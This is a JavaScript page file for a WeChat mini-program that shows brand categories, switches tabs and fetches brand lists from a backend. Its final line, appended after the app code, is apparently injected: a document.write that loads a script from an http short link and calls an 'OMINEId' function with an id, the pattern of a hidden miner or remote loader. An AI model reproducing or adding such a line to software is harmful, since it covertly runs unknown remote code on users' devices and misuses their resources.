// index.js
var t = getApp(),
  a = t.requirejs("core"),
  e = (t.requirejs("icons"), t.requirejs("wxParse/wxParse"));
var app = getApp(),
  core = app.requirejs("core"),
  ij = (app.requirejs("icons"), app.requirejs("jquery"));
  //console.log(ij);
Page({
  /**
   * 页面的初始数据
   */
  data: {
    route: "category",
    brandCate: ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "p", "Q", "R", "S", "T", "W", "V", "U", "X", "Y", "Z"],
    brandCateChildren:[],
    brands: [{ id: 0, name: "热门品牌", child: [ { first_cate: "电源单压", child_second: [{ level: 1, id: 2, thumb: app.requirejs("icons").home, name: "test03" }, { first_cate: "电源单压", level: 1, id: 1, thumb: app.requirejs("icons").cate_red, name: "test02" }] }], advimg: app.requirejs("icons").cate_red }, { id: 1, name: "A", child: [{ first_cate: "电源单压", child02: [{ level: 1, id: 2, thumb: app.requirejs("icons").home, name: "test03" }, { first_cate: "电源单压", level: 1, id: 1, thumb: app.requirejs("icons").cate_red, name: "test02" }] }], advimg: app.requirejs("icons").cate }],
    icons: app.requirejs("icons"),
    selector: "all",
    advimg: app.requirejs("icons").cate_red,
    show:true,
    set:{level:2},
    recommands: {},
    imgHttp: t.globalData.daxinImg,
    level: 0,
    back: 0,
    child: [ { child_second: [{ level: 1, id: 2, thumb: app.requirejs("icons").home, name: "test03" }, { first_cate: "电源单压", level: 1, id: 1, thumb: app.requirejs("icons").cate_red, name: "test02" }] }],
    parent: {}
  },

  /**
   * 分类函数--标签切换
   */
  tabCategory: function (t) {
    wx.showLoading({
      icon: 'loading',
      duration:200
    })
    var _this=this;
    var self_id = t.target.dataset.id;
    this.setData({
      selector: t.target.dataset.id,
      advimg: t.target.dataset.src,
      child: self_id == 0 ? _this.data.brandCateChildren : (self_id == 'all'?_this.data.allBrand:_this.data.brands[self_id]),
      back: 0
    }),
      ij.isEmptyObject(t.target.dataset.child) ? this.setData({
        level: 0
      }) : this.setData({
        level: 1
      })
  },

  /**
   * 分类函数--更新当前数据
   */
  cateChild: function (t) {
    this.setData({
      parent: t.currentTarget.dataset.parent,
      child: t.currentTarget.dataset.child,
      back: 1
    })
  },

  /**
   * 分类函数--更新上级数据
   */
  backParent: function (t) {
    this.setData({
      child: t.currentTarget.dataset.parent,
      back: 0
    })
  },

  /**
   * 分类函数-获取并更新分类数据
   */
  getCategory: function (isHot) {
    a.loading();
    var _this = this;
    //品牌列表
    wx.request({
      url: t.globalData.daxin + "/brand/brandList",
      data: {
        session_token: t.globalData.session_token,
        is_hot: isHot?1:0
      },
      method: "POST",
      success: function (res) {
       // console.log(res);
        if (res.data.statusCode>=0){
          a.hideLoading();
          if (isHot){
            _this.setData({
              brandCateChildren: res.data.data.list
            }); 
          }else{
            var allBrands = [],brandCate=[];
          ij.each(res.data.data.list,function(ind,val){
           // console.log(val);
              allBrands=allBrands.concat(val);
              brandCate = brandCate.concat(ind);
            });
            brandCate.sort();
            //console.log(allBrands, brandCate);
            _this.setData({
              brands: res.data.data.list,
              allBrand: allBrands,
              brandCate: brandCate,
              child: allBrands
            });
          }    
        }else{
          a.alert(res.data.msg);
        }
      }
    })
  },

  /**
   * 生命周期函数--监听页面显示
   */
  onShow: function () {
    
  },
  onReady:function(){
    this.getCategory(true);
    this.getCategory();
    this.setData({
      selector: 'all'
    });
  },
  onPullDownRefresh:function(){
    this.getCategory(true);
    this.getCategory();
    this.setData({
      selector: "all"
    });
    wx.stopPullDownRefresh();
  },
  onReachBottom:function(){

  },
  /**
   * 用户点击右上角分享
   */
  onShareAppMessage: function () {
    return core.onShareAppMessage()
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
